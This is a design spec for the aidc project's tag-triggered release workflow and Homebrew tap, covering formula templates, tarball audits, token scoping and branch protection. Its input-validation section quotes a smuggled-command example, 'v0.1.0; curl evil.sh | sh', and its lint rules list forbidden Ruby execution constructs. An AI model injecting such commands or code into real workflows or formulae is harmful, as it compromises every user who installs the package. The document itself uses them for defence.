> **Status (2026-08-11): shipped, with amendments.** `release.yml`, the formula
> templates, and the tarball audits are live. Differences from the spec below:
> REL-03's "gates on `make smoke`" is superseded by the v0.6.1 decision — smoke
> is a local pre-tag gate, not a CI job (see task-12's status note). The release
> workflow hashes the tag-archive (codeload) byte stream, the same bytes the
> formula's `archive/refs/tags/…` URL serves. The operator checklist lives at
> `docs/release-process.md`.

# task-14: Release Engineering + Homebrew Tap

## Objective

Make aidc installable via `brew tap pacepace/aidc && brew install aidc` on macOS (and Linuxbrew on Linux as a side-effect), with a tag-triggered release workflow that gates on smoke passing. Build the entire release flow once, then iterate releases with `git tag vX.Y.Z` and let CI do the rest.

The brew formula and release tarball coexist with the unchanged "clone + `make install`" path for developers. Two audiences, two install paths, neither replaces the other.

This task depends on:
- task-12 (CI smoke gate) — the release workflow gates on the existing smoke check.
- task-13 (versioned image tags) — `aidc/*:vX.Y.Z` is what `brew upgrade` rebuilds against.

---

## Requirements

| ID | Requirement | Priority |
|----|-------------|----------|
| REL-03 | Tagging the repo with `v*` MUST trigger a GitHub Actions release workflow that gates on `make smoke` passing, generates a release tarball, and creates a GitHub Release with the tarball attached. | P0 |
| REL-04 | The release tarball MUST contain everything needed to run aidc from a clean checkout: `scripts/`, `proxy/`, `.devcontainer/`, `mcp/`, `docs/`, `Makefile`, `LICENSE`, `README.md`, `VERSION`. It MUST exclude `tests/scratch/`, `.git/`, audit data, and any other developer-only artifacts. | P0 |
| REL-05 | A separate `pacepace/homebrew-aidc` repo MUST host the Homebrew tap formula (`Formula/aidc.rb`). The tap repo's only purpose is to host the formula; no source code lives there. | P0 |
| REL-06 | The release workflow MUST update the tap's formula with the new version and tarball sha256 on every successful tag-triggered release. Updates MUST use a deploy key or fine-scoped PAT, never a long-lived account token. | P0 |
| REL-07 | The Homebrew formula MUST install the CLI scripts + image build contexts (`proxy/`, `.devcontainer/`) under `prefix/libexec/` and symlink `scripts/aidc` into `prefix/bin/`. It MUST declare runtime deps: `jq`, `gettext` (for `envsubst`). Docker is declared in `caveats` (not `depends_on`) because Homebrew's docker formula doesn't provide a daemon. | P0 |
| REL-08 | Docker images MUST NOT be pre-built or pushed to any registry. Every aidc install builds images locally on first `aidc create`. This is a deliberate choice: zero registry maintenance, hermetic builds, and an audience (advanced AI devs with Claude Max subscriptions) that tolerates a 10-15 minute first-run build. | P0 |

---

## Design Context

### Why a separate tap repo

Homebrew taps are *required* to live in a repo named `homebrew-<tapname>`. The user types `brew tap pacepace/aidc`; brew looks for `github.com/pacepace/homebrew-aidc`. The tap repo holds only the formula (a Ruby file) and a one-line README. Everything else — source, docs, tarballs — lives here.

Pace's preference (verbatim): *"I'd prefer that to all be in this repo, but if we need a second one just for the ruby [...] then sobeit."* It is required. The Ruby formula lives in `pacepace/homebrew-aidc/Formula/aidc.rb`. The *template* and the *automation that updates it* live here.

### Versioned formulae for parallel installs

A single `Formula/aidc.rb` only supports one installed version at a time. The realistic scenarios we have to support:

- A v0.1.x user hits a regression in v0.2.0 and needs to roll back without losing their installs.
- A user pins to v0.1.x because their company's compliance review covered that version specifically; v0.2 must be available without forcing the v0.1 install away.
- A hotfix v0.1.1 ships while main is on v0.2.0-dev; users on v0.1.0 must be able to update to v0.1.1 without upgrading to v0.2.

Homebrew's convention for parallel-installable versions is **versioned formulae**: a formula named `Formula/aidc@MAJOR.MINOR.rb` (e.g. `aidc@0.1.rb`) installs alongside the unversioned `Formula/aidc.rb`. Users can `brew install aidc@0.1` to pin or `brew install aidc` for latest.

**The release workflow MUST render BOTH on every release:**

1. `Formula/aidc.rb` — always points at the latest version. Overwritten on every release.
2. `Formula/aidc@MAJOR.MINOR.rb` — version-pinned snapshot. Created on every release; the file for the major.minor line stays in the tap repo forever (one file per major.minor line ever shipped).

The versioned formula uses `keg_only` (no automatic `bin/aidc` symlink — would conflict with the unversioned formula's symlink). Users opt in to a versioned binary with `brew link --force aidc@0.1`, which makes it explicit.

### Hotfix from a release branch

The release-process doc MUST describe the hotfix flow because it differs from main-line:

1. Branch from the prior release tag: `git checkout -b release/v0.1 v0.1.0`
2. Apply the fix; tests; bump VERSION on this branch from `v0.1.0` to `v0.1.1`.
3. Commit, push the branch; tag `git tag v0.1.1`.
4. Push the tag: `git push origin v0.1.1`. The release workflow triggers off the tag regardless of which branch it points to.
5. After the release lands, cherry-pick the fix to main (or merge the branch — whichever fits the change).

The workflow itself needs no changes for this — `on: push: tags: ['v*']` already covers any branch. The doc just has to spell out the human procedure.

### Cross-repo write: deploy key vs PAT

The release workflow in THIS repo needs to commit to the TAP repo. Three ways:

1. **Personal Access Token (PAT) with `repo` scope.** Works but is over-permissive; the token can write any repo Pace owns.
2. **Fine-scoped PAT scoped to `pacepace/homebrew-aidc` only.** Safer. PAT lives in this repo's Actions secrets as e.g. `TAP_REPO_TOKEN`.
3. **Deploy key on the tap repo, private key in this repo's secrets.** SSH-style; tied to one repo by construction. Slightly more setup, slightly less attack surface.

Pick option 2 (fine-scoped PAT). Deploy keys are nicer in theory but require an additional setup step that's easy to misconfigure on first attempt; PATs are well-understood. Document the scope (read+write on `pacepace/homebrew-aidc` only) in `docs/release-process.md`.

### Why "build images on every machine, never publish"

Reaffirmed by the user in this conversation. Trade-offs:

| | Build on machine (chosen) | Pre-publish |
|---|---|---|
| First-time UX | 10-15 min build | 2-3 min pull |
| Registry maintenance | none | continuous |
| Multi-arch | automatic | matrix builds |
| Air-gap | works | broken |
| Supply chain | source-level transparent | image-level trust |
| Audience match | advanced devs with patience | mass-market |

For aidc's audience (Claude Max subscribers, advanced AI devs) the chosen path is correct. If "10 minutes is too long" surfaces as a real complaint from real users (not a hypothetical concern), the decision gets revisited at that point — but the decision IS that we build on every machine, never publish.

**Security stance:** REL-08 is net positive for the project's threat model. It closes: (a) registry-account compromise → malicious image pushes, (b) trust-on-first-use questions about who built the image and when, (c) image-signing infrastructure burden (cosign / sigstore / etc.). It opens: (a) each user's local builds hit upstream registries (npm, PyPI, apt, cargo) directly, so a compromised upstream package hits every user — BUT only inside the sandboxed dev container, which is the whole point. The sandbox is what limits blast radius. We have not made the security posture worse by skipping image publishing; we've shifted the trust boundary closer to source, which is correct.

### Tarball-byte-stability assumption

The release workflow downloads GitHub's auto-generated tarball at `https://github.com/.../archive/refs/tags/${TAG}.tar.gz` and computes its sha256, then writes that sha256 into the brew formula. Users running `brew install aidc` download the same URL and brew verifies the sha256.

**Risk:** GitHub has historically (rarely) changed tarball-generation parameters — gzip compression level, file ordering, timestamp handling. If they ever change them, every formula's pinned sha256 becomes wrong and every brew install fails with a hash mismatch — which is the *safe* failure direction (user gets an error, NOT a silent install of different bits). Acknowledge this in the doc; the response is "regenerate the formula" — no users are harmed, the install just fails loudly until the formula is republished.

**No mitigation needed in this task.** The hash-mismatch failure mode is correct. Users see a useful error; we re-tag-and-release if the issue recurs.

### Formula install layout

The brew formula installs into `${prefix}` where prefix is `/opt/homebrew/Cellar/aidc/v0.1.0/` (Apple Silicon) or `/usr/local/Cellar/aidc/v0.1.0/` (Intel/Linuxbrew). The `libexec.install Dir["*"]` call drops the tarball's top-level entries DIRECTLY into `libexec/` (no extra `aidc/` nesting), so the layout is:

```
libexec/
    scripts/
        aidc
        cmd-*.sh
        lib/*
    proxy/
        squid/, refresher/, policy/, audit/, forwarder/
        compose.yaml.template
        compose-render.sh
    .devcontainer/
        Dockerfile
        *.sh
        ...
    mcp/
        Dockerfile
        src/
        ...
    Makefile        # so `make smoke` works against an installed copy too
    VERSION
    LICENSE
    README.md
    docs/done/      # design docs ship with the install for offline reference
bin/
    aidc -> ../libexec/scripts/aidc
```

`scripts/aidc` resolves `AIDC_ROOT` from its own location, so a symlink invocation from `bin/aidc` correctly resolves to `libexec/`. No code changes needed in the CLI for this.

### Tarball layout

The release tarball at `https://github.com/pacepace/aidc/archive/refs/tags/v0.1.0.tar.gz` is auto-generated by GitHub from the tag's tree. Top-level dir inside is `ai-devcontainer-0.1.0/` (no `v` in the dir name; this is GitHub's convention). The formula's `install` block accounts for this.

We do NOT need a separate "release-artifact" tarball uploaded as an asset; the auto-generated source tarball is sufficient. Release notes for each GitHub Release are auto-generated by `softprops/action-gh-release`'s built-in `generate_release_notes: true` option, which assembles a per-tag changelog from merged PR titles since the previous tag. No separate `CHANGELOG.md` file is maintained.

---

## Research

- Homebrew formula cookbook: https://docs.brew.sh/Formula-Cookbook — the authoritative reference for what goes in a formula
- Tap creation: https://docs.brew.sh/How-to-Create-and-Maintain-a-Tap — explicit walkthrough of the `homebrew-<name>` repo + Formula dir convention
- BuildKit + GHA cache (already linked in task-12): https://docs.docker.com/build/cache/backends/gha/
- GitHub Actions `softprops/action-gh-release`: https://github.com/softprops/action-gh-release — well-maintained action for creating GitHub Releases from a tag
- GitHub Actions checkout for cross-repo writes: https://github.com/actions/checkout — set `repository:` and `token:` to push to another repo
- An example minimal formula for a bash CLI: https://github.com/Homebrew/homebrew-core/blob/master/Formula/g/git-flow.rb is similar shape (bash-driven, libexec-installed, symlinked to bin)

---

## Patterns to Follow

- The smoke job from task-12 is the gate this workflow reuses. The release workflow either (a) re-runs smoke directly, or (b) depends on the smoke check on the tag commit having passed. Approach: re-run smoke inline. Cheaper than wiring inter-workflow dependencies.
- `scripts/aidc` exports `AIDC_VERSION` (task-13). The release workflow reads `VERSION` directly from the checked-out tree to derive the tag.

---

## Files to Create

### `pacepace/homebrew-aidc` repo (NEW, separate repo)

Owned by Pace; created manually before this task's PR merges. The repo contains:

```
Formula/
    aidc.rb
README.md
```

`README.md` is a one-liner:
```markdown
# homebrew-aidc

Homebrew tap for [aidc](https://github.com/pacepace/aidc).

    brew tap pacepace/aidc
    brew install aidc
```

`Formula/aidc.rb` is generated by the release workflow on first release (NOT committed by hand). Initial template lives at `release/Formula/aidc.rb.tmpl` in this repo — see "Files to Create" below.

**Action items for the human BEFORE this task's PR merges.** These are NOT subagent-doable — they require Pace (or a repo admin) to perform them in the GitHub UI / via `gh`. Grouped by which repo the action targets:

#### A. Tap repo (`pacepace/homebrew-aidc`)
1. Create the `pacepace/homebrew-aidc` GitHub repo (public; empty).
2. Add a one-line `README.md` to the tap repo by hand (the release workflow doesn't touch README).
3. Add branch protection on the tap repo's `main` branch:
   - Require linear history.
   - Restrict who can push to `main`. The ONLY identity allowed to push is whichever identity the `TAP_REPO_TOKEN_EXPIRES_*` PAT belongs to (Pace's account in v0.1).
   - Disable "Allow administrators to bypass" — even Pace shouldn't push directly to main via the GitHub UI or `git push`. All changes go through the release workflow.
   - Manual recovery from a botched release: use `git revert` via a PR, NOT direct push. The PR can be self-approved if needed, but the audit trail (a revert commit) is preserved.
   - Rationale: the tap is the highest-blast-radius asset. A phished Pace-account is the single point of failure if personal pushes are permitted. Moving recovery through PR-with-revert closes that door without sacrificing the ability to fix a botched release.
4. Set up the daily cron job in the tap repo (separate workflow file in the tap repo, NOT in this repo) that alerts on unexpected committers per `docs/release-process.md`. The cron workflow's source file is created in the tap repo by Pace, manually, before the first release. (Subagent implementing this task documents it in release-process.md but does NOT create the file — it lives in a different repo.)

#### B. GitHub org / account
5. Create the GitHub team `aidc-maintainers` in Pace's GitHub account/org. Initial membership: `@pacepace` only. The CODEOWNERS file in THIS repo and the tag-protection rules below reference this team.
6. Generate a fine-scoped PAT with `Contents: Read & Write` permission on `pacepace/homebrew-aidc` ONLY. No other scopes. No "all repos."
7. Set the PAT expiry to **90 days maximum** (GitHub's fine-scoped PAT UI lets you pick up to 1 year or "no expiration"; pick 90 days or shorter, calendar a rotation reminder for day 75).
8. Save the PAT in THIS repo's Actions secrets with the date-encoded name `TAP_REPO_TOKEN_EXPIRES_YYYY_MM_DD` (substitute the actual expiry date). The release.yml workflow references this exact secret name.

#### C. This repo (`pacepace/aidc`)
9. Add branch protection on THIS repo's `main` branch:
   - Require status checks: `smoke` and `lint` MUST be green.
   - Require pull request reviews before merging.
   - Require review from Code Owners.
   - **Dismiss stale pull request approvals when new commits are pushed.** Without this, a PR that's been approved can be amended with new changes and ship without re-review.
   - Require linear history.
10. Add tag protection rules on THIS repo:
    - Rule pattern: `v*`.
    - Restrict who can push tags matching that pattern to the `aidc-maintainers` team only.
    - Rationale: a contributor with write access (but not maintainer status) MUST NOT be able to push a tag from a feature branch with malicious changes and trigger the release workflow. Tag protection closes this attack chain — a tag push by a non-maintainer fails at the GitHub layer, NOT just at the workflow's tag→commit verification (which would still create a workflow run with potential for noise).

These steps are out of scope for the subagent implementing this task. The PR description MUST call them out so Pace performs them before merging.

### `release/Formula/aidc.rb.tmpl` and `release/Formula/aidc@version.rb.tmpl`

Two templates the release workflow renders. The workflow substitutes `__VERSION__` (e.g. `v0.1.0`), `__SHA256__` (the tarball's sha256), and (for the versioned template) `__VERSION_TAG__` (e.g. `0.1`, the major.minor only) before committing to the tap repo. Note the placeholder syntax: double-underscore-bracketed, NOT bash-style `${VAR}` — Ruby would try to interpolate `${...}` if it were inside a double-quoted string, leading to confusing render bugs. Double-underscore is unambiguous.

**Threat model for the templates:** these files contain Ruby code that runs as the user (`brew install`) and as a tester (`brew test`). A PR that modifies a template — even subtly, even bundled into an otherwise-legitimate change — ships its modifications to every user on the next tagged release. The release workflow's TAP_REPO_TOKEN, branch protection, SHA pinning, and tarball audit ALL fail to stop this because the malicious code is in a file the workflow legitimately renders. Two defenses, both REQUIRED:

1. **Template-content lint** (in `make lint` and CI lint job; same regex enforced everywhere): the `release/Formula/*.tmpl` files MAY contain ONLY:
   - Ruby `class`, `def`, `end` keywords
   - The documented placeholders `__VERSION__`, `__SHA256__`, `__VERSION_TAG__`, `__VERSION_TAG_SAFE__`
   - String literals (single and double quoted)
   - Heredocs (`<<~EOS ... EOS`)
   - Comments (lines starting with `#`)
   - Method calls to a fixed allowlist: `desc`, `homepage`, `url`, `sha256`, `license`, `depends_on`, `keg_only`, `install`, `caveats`, `test`, `libexec.install`, `bin.install_symlink`, `Dir`, `assert_match`, `shell_output`, `version.to_s`, `HOMEBREW_PREFIX` interpolation
   - Conditional `if`, `unless` only at the documented scopes
   - NOTHING ELSE — specifically NOT: `system(`, `exec(`, `eval`, `IO.popen`, `Open3.`, backticks, `\``, `Process.`, `Kernel.`, `__send__`, `instance_eval`, `class_eval`, `define_method`, `open(`, `URI.open`, `require_relative` with non-literal arg
   - Implementation: `make lint` runs `release/lint-formula-template.sh` against each `release/Formula/*.tmpl`. The script greps for forbidden constructs and exits non-zero on any hit.

2. **CODEOWNERS** at `.github/CODEOWNERS`: `release/Formula/* @pacepace` (and `.github/workflows/release.yml @pacepace`, and `release/tarball-audit*.sh @pacepace`, and `make lint`-relevant files). Branch protection on `main` requires CODEOWNERS approval for these paths — a malicious PR modifying a template gets escalated to Pace by virtue of touching the path.

Both defenses MUST land in this task. Lint catches the obvious; CODEOWNERS catches the cases where lint is bypassed or rules drift.

**File header (REQUIRED, both templates):**

```ruby
# This file is GENERATED by .github/workflows/release.yml.
# Do not edit by hand; edits will be overwritten on the next release.
# Source template: release/Formula/aidc.rb.tmpl (or aidc@version.rb.tmpl)
#
# This file is RUBY that runs unprivileged on every user's machine via
# `brew install`. See task-14's template threat model: any execution
# construct beyond the documented allowlist is rejected by `make lint`.
```

**Unversioned template (`release/Formula/aidc.rb.tmpl`):**

```ruby
# (header above)
class Aidc < Formula
  desc "AI Dev Container: sandboxed Claude Code, locked-down egress, taint detection"
  homepage "https://github.com/pacepace/aidc"
  url "https://github.com/pacepace/aidc/archive/refs/tags/__VERSION__.tar.gz"
  sha256 "__SHA256__"
  license "MIT"

  depends_on "jq"
  depends_on "gettext"   # provides envsubst

  def install
    # Install everything from the tarball EXCEPT tests/ (host smoke harness
    # only; not needed at runtime and would bloat the install).
    libexec.install Dir["*"].reject { |f| f == "tests" }
    bin.install_symlink libexec/"scripts/aidc"
  end

  def caveats
    <<~EOS
      aidc requires Docker. Install it from https://www.docker.com/products/docker-desktop/
      (macOS) or your distro's package manager (Linux), and ensure the daemon is running:

        docker info

      First `aidc create` builds the dev container images locally (~10-15 min on
      a fresh install). Subsequent creates reuse the built images and complete in ~30s.

      After a `brew upgrade aidc`, the next `aidc create` will rebuild container
      images against the new Dockerfile (~10-15 min). Already-running sessions
      keep their old image until you `aidc kill` them. Old aidc/*:vOLD images
      remain on disk until you `docker image rm aidc/*:vOLD` -- typically a few
      GB per prior version. Cleanup is opt-in (you may want to keep them for
      rollback).

      To pin to a specific major.minor line (e.g. for compliance review):

        brew install aidc@0.1
        brew link --overwrite --force aidc@0.1
    EOS
  end

  test do
    assert_match version.to_s, shell_output("#{bin}/aidc help").lines.first
  end
end
```

**Versioned template (`release/Formula/aidc@version.rb.tmpl`):**

```ruby
# (header above)
class AidcAT__VERSION_TAG_SAFE__ < Formula
  desc "AI Dev Container __VERSION_TAG__ — pinned major.minor for stability/compliance"
  homepage "https://github.com/pacepace/aidc"
  url "https://github.com/pacepace/aidc/archive/refs/tags/__VERSION__.tar.gz"
  sha256 "__SHA256__"
  license "MIT"

  keg_only :versioned_formula

  depends_on "jq"
  depends_on "gettext"

  def install
    libexec.install Dir["*"].reject { |f| f == "tests" }
    # keg_only means brew will not symlink bin/ contents into the prefix's bin
    # by default; this versioned formula's binary lives at
    # ${prefix}/Cellar/aidc@MAJOR_MINOR/VERSION/libexec/scripts/aidc.
    # No bin.install_symlink call -- otherwise `brew link --force` would
    # conflict directly with the unversioned aidc formula's bin/aidc.
    # Users explicitly invoke this version via the keg path or with
    # `brew link --overwrite --force aidc@VERSION` (documented in caveats).
  end

  def caveats
    <<~EOS
      aidc@__VERSION_TAG__ is keg-only and won't be on your PATH by default.

      For a quick check on this pinned version without switching defaults:
        #{HOMEBREW_PREFIX}/opt/aidc@__VERSION_TAG__/libexec/scripts/aidc <subcommand>

      To switch your default `aidc` binary to this pinned version:
        brew unlink aidc 2>/dev/null
        brew link --overwrite --force aidc@__VERSION_TAG__

      To go back to the latest unversioned aidc:
        brew unlink aidc@__VERSION_TAG__
        brew link aidc
    EOS
  end

  test do
    assert_match version.to_s, shell_output("#{libexec}/scripts/aidc help").lines.first
  end
end
```

The test path is `#{libexec}/scripts/aidc` — `libexec.install Dir["*"]` puts the tarball's top-level entries (including `scripts/`) directly under `libexec/`, no extra nesting.

Note `__VERSION_TAG_SAFE__` is the major.minor with the dot replaced by an underscore (Ruby class names can't contain dots — `AidcAT0.1` is invalid; `AidcAT0_1` is the convention). The release workflow performs both substitutions.

Notes on the templates (binding decisions, NOT suggestions):

- **`depends_on "docker"` is NOT included.** Homebrew's `docker` formula installs the Docker CLI but does not provide a daemon; on macOS the daemon comes from Docker Desktop (not on brew). Listing it as a dep would mislead users into thinking brew can handle it. The `caveats` block tells users to install Docker themselves.
- **`depends_on "bash"` is NOT included.** macOS bash 3.2 is sufficient (the codebase is bash-3.2 compatible by design). Adding the dep installs bash 5.x via brew, which is fine but unnecessary; keep deps minimal.
- **`libexec.install Dir["*"].reject { |f| f == "tests" }`** excludes the smoke harness from the install. `tests/` is for developer-side smoke runs, not user-side runtime. Without this filter, every brew install ships ~20MB of test scaffolding the user will never run.
- **`bin.install_symlink`** in the unversioned formula creates `bin/aidc -> libexec/scripts/aidc`. In the versioned formula, `keg_only` suppresses the default linking — `bin.install_symlink` still creates the symlink within the keg, but brew doesn't expose it on PATH until the user explicitly `brew link --force`.
- **`test do ... shell_output ... end`** brew's built-in test framework. `brew test aidc` runs this. Asserts `aidc help` runs and the first line contains the version. Depends on the cmd-help.sh edit in "Files to Modify" below.

### `.github/workflows/release.yml`

The release workflow. Triggers on `push: tags: ['v*']`. Jobs:

1. **smoke** — re-runs the smoke harness on the tagged commit. Invokes the callable `smoke.yml` (task-12) via `uses: ./.github/workflows/smoke.yml`. If smoke fails, the release does NOT proceed.
   - Job-level permissions: `contents: read`. No more.
   - Concurrency: this job's concurrency key MUST be different from the PR-time smoke key (`smoke-${{ github.ref }}`). Use `release-smoke-${{ github.ref }}`. The `release-` prefix isolates it from PR cancellations.

2. **release** (depends on smoke) —
   - Checks out the tagged commit via `actions/checkout` pinned by 40-char SHA.
   - **Tag-VERSION sync check** (fails the job if mismatched).
   - **Pre-download tag→commit verification:**
     ```bash
     EXPECTED_SHA="${GITHUB_SHA}"
     ACTUAL_SHA=$(gh api "repos/${GITHUB_REPOSITORY}/git/refs/tags/${GITHUB_REF_NAME}" --jq '.object.sha')
     if [ "$EXPECTED_SHA" != "$ACTUAL_SHA" ]; then
         echo "::error::tag ${GITHUB_REF_NAME} points at ${ACTUAL_SHA}, not the just-built commit ${EXPECTED_SHA}"
         exit 1
     fi
     ```
   - Downloads the tarball from `https://github.com/pacepace/aidc/archive/refs/tags/${GITHUB_REF_NAME}.tar.gz` via `curl -fsSL`. NOT via `actions/checkout` — we need the same byte sequence brew users will download.
   - **POST-download tag→commit re-verification** (closes the TOCTOU window between pre-check and download):
     ```bash
     ACTUAL_SHA=$(gh api "repos/${GITHUB_REPOSITORY}/git/refs/tags/${GITHUB_REF_NAME}" --jq '.object.sha')
     if [ "$EXPECTED_SHA" != "$ACTUAL_SHA" ]; then
         echo "::error::tag was re-pointed during tarball download; aborting"
         exit 1
     fi
     ```
     If anyone (including a malicious actor with write access) re-tags between the pre-check and the download, the post-check catches it and aborts. The release does not proceed.
   - Computes `sha256sum` of the downloaded tarball.
   - **Tarball-content audit (TWO passes):**
     - First pass: `release/tarball-audit.sh` runs `git ls-tree -r HEAD --name-only` against the checked-out commit tree. Catches forbidden files in the source.
     - Second pass: `tar tzf <downloaded-tarball> | release/tarball-audit-extracted.sh` runs the same forbidden-pattern grep against the **actual tarball contents** as extracted by `tar tzf`. This catches `.gitattributes`-driven `export-subst` expansions or `export-ignore` misconfigurations that diverge the archive from the tree.
     - Both passes MUST succeed. If either finds a forbidden file, the release aborts.
   - Creates a GitHub Release via `softprops/action-gh-release` pinned by 40-char SHA with the tag as the release name. No extra assets (the source tarball is auto-attached by GitHub).
   - Job-level permissions: `contents: write` (to create the GitHub Release on THIS repo). Nothing else. NO `packages: write`. NO `id-token: write` — signed releases via sigstore are not part of this project's design; the hash-mismatch failure mode (Design Context above) is the chosen integrity check.
   - The job MUST include a `# justify:` comment immediately above the permissions block, e.g.:
     ```yaml
     release:
       # justify: contents: write is required to create the GitHub Release on tag push
       permissions:
         contents: write
     ```
     `make lint` (task-12) enforces this comment; absence fails lint.

3. **update-tap** (depends on release) —
   - Checks out the `pacepace/homebrew-aidc` repo using `actions/checkout` (pinned by SHA) with `token: ${{ secrets.TAP_REPO_TOKEN_EXPIRES_YYYY_MM_DD }}` and `repository: pacepace/homebrew-aidc`.
   - **Derives `MAJOR_MINOR` from the tag** with an explicit regex (handles pre-release / build-metadata suffixes):
     ```bash
     # v0.1.0 -> 0.1
     # v0.1.0-rc1 -> 0.1
     # v0.1.0+sha.abc1234 -> 0.1
     MAJOR_MINOR=$(printf '%s\n' "${GITHUB_REF_NAME}" | sed -E 's/^v([0-9]+\.[0-9]+).*/\1/')
     # Validate: MAJOR_MINOR must be e.g. "0.1" -- two integers separated by a dot.
     case "$MAJOR_MINOR" in
         [0-9]*.[0-9]*) : ;;
         *) echo "::error::could not derive MAJOR_MINOR from ${GITHUB_REF_NAME}"; exit 1 ;;
     esac
     MAJOR_MINOR_SAFE="${MAJOR_MINOR//./_}"   # for Ruby class name: 0.1 -> 0_1
     ```
   - **Determines whether to update the unversioned `Formula/aidc.rb`** (skip-unversioned-on-older-line logic). Uses `sort -V` (version sort) for the comparison. **`sort -V` semantics are stable on GNU coreutils (ubuntu-latest); BSD coreutils (macOS) handle pre-release suffixes (`v0.1.0-rc1` vs `v0.1.0`) differently.** Since the release workflow runs ONLY on `ubuntu-latest`, this is safe today. If the workflow is ever migrated to a macOS runner (via task-12's `runs-on` input), the version comparison MUST be reviewed.
     ```bash
     # If the unversioned formula doesn't exist yet (first release), update it.
     # Otherwise compare the new version to the formula's current version using sort -V.
     UPDATE_UNVERSIONED=1
     if [ -f Formula/aidc.rb ]; then
         CURRENT=$(grep -E '^\s+url\s+' Formula/aidc.rb | sed -E 's/.*archive\/refs\/tags\/([^"]+)\.tar\.gz.*/\1/')
         # ${GITHUB_REF_NAME} is the new tag (e.g. v0.1.1). CURRENT is the existing tag (e.g. v0.2.0).
         # Update only if new >= current.
         HIGHEST=$(printf '%s\n%s\n' "$CURRENT" "${GITHUB_REF_NAME}" | sort -V | tail -1)
         if [ "$HIGHEST" != "${GITHUB_REF_NAME}" ]; then
             UPDATE_UNVERSIONED=0   # new tag is older than what's installed via unversioned; skip
         fi
     fi
     # Manual override for cases where the auto-detection is wrong (rare; documented in release-process.md).
     if [ "${SKIP_UNVERSIONED:-0}" = "1" ]; then
         UPDATE_UNVERSIONED=0
     fi
     ```
   - Renders the formula(e):
     - If `UPDATE_UNVERSIONED=1`: render `Formula/aidc.rb` from `release/Formula/aidc.rb.tmpl` (substitute `__VERSION__`, `__SHA256__`).
     - ALWAYS render the versioned formula: `Formula/aidc@${MAJOR_MINOR}.rb` from `release/Formula/aidc@version.rb.tmpl` (substitute `__VERSION__`, `__SHA256__`, `__VERSION_TAG__` (the `MAJOR_MINOR` like `0.1`), `__VERSION_TAG_SAFE__` (the underscored form like `0_1`)).
   - **Charset-validates each substitution value** before applying:
     ```bash
     # All four substitution values MUST match [a-zA-Z0-9._-]+ (no shell/Ruby metacharacters).
     for v in "$VERSION" "$SHA256" "$MAJOR_MINOR" "$MAJOR_MINOR_SAFE"; do
         case "$v" in
             *[!a-zA-Z0-9._-]*|"")
                 echo "::error::substitution value contains forbidden characters: '$v'"
                 exit 1
                 ;;
         esac
     done
     ```
   - Validates each rendered file with `ruby -c <file>` before committing — catches template-rendering syntax bugs before they reach users.
   - Commits the changed files in ONE commit. Message: `aidc ${GITHUB_REF_NAME} (${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID})` so the tap's history is self-documenting and traceable back to the workflow run.
   - Pushes directly to the tap's `main` branch.
   - Job-level permissions: `contents: read` (only read on THIS repo; the cross-repo write uses TAP_REPO_TOKEN, not GITHUB_TOKEN).

**Top-level `permissions:`** declared as `{}` (empty). Per-job grants are the only way scope expands.

**Top-level `concurrency:`** key on `release-${{ github.ref }}` with `cancel-in-progress: false` — cancelling a release mid-tap-update would leave the tap repo in an inconsistent state. Better to queue.

**Workflow triggers** — the workflow has TWO triggers:

```yaml
on:
  push:
    tags: ['v*']
  workflow_dispatch:
    inputs:
      tag:
        description: 'Tag to dry-run against (e.g. v0.1.0). workflow_dispatch is dry-run ONLY.'
        type: string
        required: true
```

`workflow_dispatch` is **dry-run only** — there is no `dry_run=false` input. The only way to ship a real release is `push: tags: ['v*']` (i.e. `git push origin v0.1.0`). This prevents a phished/compromised maintainer with workflow-trigger rights from shipping a release without pushing a tag.

**Input validation on the `tag` input** — first step in the release job, BEFORE the input is used anywhere:

```yaml
- name: Validate tag input
  run: |
    # Reject anything that doesn't match the canonical v[MAJOR].[MINOR].[PATCH] shape.
    # Same regex as task-13's AIDC_VERSION validation -- preserves shell-safety in all downstream uses.
    TAG="${{ inputs.tag || github.ref_name }}"
    case "$TAG" in
        v[0-9]*) : ;;
        *) echo "::error::invalid tag input '${TAG}'"; exit 1 ;;
    esac
    if ! printf '%s' "$TAG" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+([.-][a-zA-Z0-9]([a-zA-Z0-9.]*[a-zA-Z0-9])?)?(\+[a-zA-Z0-9]([a-zA-Z0-9.]*[a-zA-Z0-9])?)?$'; then
        echo "::error::tag '${TAG}' does not match canonical v[MAJOR].[MINOR].[PATCH][pre][+build]"
        exit 1
    fi
    echo "TAG=${TAG}" >> "$GITHUB_ENV"
```

After this step, downstream steps reference `${TAG}` (env) — NOT `${{ inputs.tag }}` (expression interpolation). This protects against shell-metacharacter injection from a malicious `workflow_dispatch` invocation (e.g. `tag: "v0.1.0; curl evil.sh | sh"`).

When invoked via `workflow_dispatch`:
- Every step runs (smoke, tarball download, tag→commit re-verify, audit, template render, tap checkout, formula validation).
- The two steps that have user-visible side-effects are gated on `${{ github.event_name == 'push' }}` and SKIPPED on `workflow_dispatch`:
  - `softprops/action-gh-release` — no GitHub Release created.
  - `git push` to the tap — no formula committed.
- Prints "DRY-RUN OK" or "DRY-RUN FAILED" with diagnostic info.

The job-level guards look like:
```yaml
- name: Create GitHub Release
  if: github.event_name == 'push'
  uses: softprops/action-gh-release@<sha>   # vX.Y.Z
  ...

- name: Push tap formula
  if: github.event_name == 'push'
  run: git -C tap push origin main
```

This is the token-rotation verification path. Pace rotates `TAP_REPO_TOKEN_EXPIRES_*`, then `gh workflow run release.yml -f tag=v0.1.0`, confirms green, then revokes the old token.

**All third-party actions MUST be SHA-pinned.** Same rule as task-12. The release workflow's blast radius is larger (has `contents: write` AND access to `TAP_REPO_TOKEN`), so the SHA-pin discipline matters MORE here, not less. Look up the SHA for each action's intended version from the action's GitHub Releases page at implementation time. Do NOT trust example SHAs in this shard.

### `.github/CODEOWNERS`

New file. Establishes review-gating for the security-critical paths:

```
# Owners for security-critical paths. Any PR touching these requires the
# aidc-maintainers team's review.
#
# v0.1.0: the aidc-maintainers team has exactly one member (@pacepace).
# Using a team alias from day one means adding maintainers later requires
# zero CODEOWNERS edits — just update the team membership in the GitHub
# org's team settings.
VERSION                                   @pacepace/aidc-maintainers
release/Formula/                          @pacepace/aidc-maintainers
release/lint-formula-template.sh          @pacepace/aidc-maintainers
release/tarball-audit.sh                  @pacepace/aidc-maintainers
release/tarball-audit-extracted.sh        @pacepace/aidc-maintainers
.github/workflows/release.yml             @pacepace/aidc-maintainers
.github/workflows/smoke.yml               @pacepace/aidc-maintainers
.github/workflows/lint.yml                @pacepace/aidc-maintainers
